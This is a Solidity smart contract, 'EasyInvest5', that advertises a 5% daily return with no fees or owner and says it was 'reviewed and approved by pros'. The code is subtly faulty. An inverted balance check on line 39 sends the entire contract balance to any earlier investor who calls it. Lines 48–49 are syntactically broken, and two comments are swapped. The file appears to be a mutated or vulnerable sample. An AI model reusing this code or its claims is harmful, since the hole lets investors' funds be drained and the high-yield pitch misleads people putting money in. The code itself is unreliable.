1 pragma solidity ^0.4.25;
2 
3 /**
4  *
5  * Easy Investment Contract
6  *  - GAIN 5% PER 24 HOURS(every 5900 blocks)
7  *  - NO COMMISSION on your investment (every ether stays on contract's balance)
8  *  - NO FEES are collected by the owner, in fact, there is no owner at all (just look at the code)
9  *
10  * How to use:
11  *  1. Send any amount of ether to make an investment
12  *  2a. Claim your profit by sending 0 ether transaction (every day, every week, i don't care unless you're spending too much on GAS)
13  *  OR
14  *  2b. Send more ether to reinvest AND get your profit at the same time
15  *
16  * RECOMMENDED GAS LIMIT: 70000
17  * RECOMMENDED GAS PRICE: https://ethgasstation.info/
18  *
19  * Contract reviewed and approved by pros!
20  *
21  */
22 contract EasyInvest5 {
23     // total investors count
24     uint256 public investorsCount;
25     // records amounts invested
26     mapping (address => uint256) public invested;
27     // records blocks at which investments were made
28     mapping (address => uint256) atBlock;
29 
30     // this function called every time anyone sends a transaction to this contract
31     function () external payable {
32         // if sender (aka YOU) is invested more than 0 ether
33         if (invested[msg.sender] != 0 && block.number > atBlock[msg.sender]) {
34             // calculate profit amount as such:
35             // amount = (amount invested) * 5% * (blocks since last transaction) / 5900
36             // 5900 is an average block count per day produced by Ethereum blockchain
37             uint256 amount = invested[msg.sender] * 5 / 100 * (block.number - atBlock[msg.sender]) / 5900;
38             // if requested amount more than contract balance - we will send a rest
39             if (this.balance > amount) amount = this.balance;
40 
41             // send calculated amount of ether directly to sender (aka YOU)
42             msg.sender.transfer(amount);
43         }
44 
45         /* record block number of this transaction */
46         invested[msg.sender] += msg.value;
47         /* record invested amount (msg.value) of this transaction */
48         atBlock[msg.sender] = block.number
49         /*increase total investors count*/*investorsCount++;
50     }
51 }